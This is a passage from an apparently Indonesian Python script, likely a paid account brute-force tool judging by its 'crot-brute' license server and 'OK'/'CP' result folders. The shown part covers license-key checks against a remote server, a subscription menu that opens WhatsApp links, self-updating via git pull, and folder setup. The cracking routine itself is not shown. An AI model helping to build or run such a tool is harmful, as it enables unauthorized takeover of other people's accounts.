		sis = susu["readtext"]
		limid = susu["limit-device"]
		usa = susu["usage"]
	except (KeyError,IOError,AttributeError):
		print("[+] Api Key Kadaluwarsa")
		time.sleep(3)
		os.system("rm -rf .lisen")
		punya()
	print(f"""
{P}
√--------------------------------------------------------√
    __  ____   ___   ______ 
   /  ]|    \ /   \ |      | | [+] name : {aran}
  /  / |  D  )     ||      | | [+] join : {jon}
 /  /  |    /|  O  ||_|  |_| | [+] expired : {ex}
/   \_ |    \|     |  |  |   | [+] Setatus : {usa}
\     ||  .  \     |  |  |   | [+] {sis}
 \____||__|\_|\___/   |__|   | [•]-- -- ---- --- -- --[•]""")
	
	
		
def beli():
	print("[1] 7 day (40)")
	print("[2] 15 day (70)")
	print("[3] 30 day (100)")
	sit = input("[!] Pilih : ")
	if sit in[""]:
		print("[-] Pilih yang bener");beli()
	elif sit in["1"]:
		os.system(f"xdg-open https://wa.me/6283145688243?text=Durasi+:+7+day")
		print("open whatsapp")
	elif sit in["2"]:
		os.system(f"xdg-open https://wa.me/6283145688243?text=Durasi+:+15+day")
		print("open whatsapp")
	elif sit in["3"]:
		os.system(f"xdg-open https://wa.me/6283145688243?text=Durasi+:+30+day")
		print("open whatsapp")
	else:
		print("[-] Pilih yang bener");beli()
		
def ilik():
	try:
		dat = open(".lisen","r").read()
		response = requests.get(f"https://licensi.crot-brute.my.id/check.php?key={dat}&dev={platform()}").json()
		if response["setatus"]=="error":
			print(f"{response['msg'].replace('Anda telah menggunakan semua device yang tersisa, chat admin untuk menghapusnya', 'Akses login di tolak! dikarenakan anda sudah login di perangkat sebelumya.')}")
			exit()
		else:
			print("[+] Selamat Device Anda Terdaftar");kuda()
			######print(f" [+] device anda tidak terdaftar/limit,Silahkan hubungi admin")
			#####os.system("rm -rf .lisen")
	except (KeyError,IOError,AttributeError):
		api_key()

	

#MEMEMKK
if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.mkdir('/sdcard/hamz-OK')
	except:pass
	try:os.mkdir('/sdcard/hamz-CP')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	try:
		open(".lisen","r").read()
	except FileNotFoundError:
		api_key()
kuda()